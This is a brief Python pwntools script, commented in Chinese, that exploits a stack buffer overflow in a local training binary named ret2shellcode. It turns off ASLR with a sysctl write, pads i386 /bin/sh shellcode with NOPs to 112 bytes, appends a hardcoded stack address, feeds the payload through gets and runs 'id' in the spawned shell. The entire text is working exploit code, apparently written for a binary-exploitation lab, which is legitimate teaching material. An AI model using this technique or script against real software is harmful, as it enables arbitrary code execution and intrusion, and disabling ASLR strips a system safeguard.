#!/usr/bin/env python3
# ret2shellcode：栈上执行 shellcode。
# 1) 先关闭 ASLR：echo 0 | sudo tee /proc/sys/kernel/randomize_va_space
# 2) BUF 为 vuln 的 gets 缓冲区地址；本机在“绝对路径 + 空环境”下实测 0xffffdd7c。
#    注意：argv[0] 的写法会影响栈地址，脚本与测量都必须使用同一路径（这里统一用绝对路径）。
import os
from pwn import *
import time
context.log_level='error'
context.arch='i386'
BIN=os.path.abspath('../src/ret2shellcode')
BUF=0xffffdd7c
shell=asm(shellcraft.sh())
payload=shell.ljust(112,b'\x90')+p32(BUF)
io=process(BIN, env={})
io.sendline(payload)
time.sleep(0.4)
io.sendline(b'echo PWNED_SHELLCODE; id; exit')
print(io.recvall(timeout=5).decode('utf-8','replace'))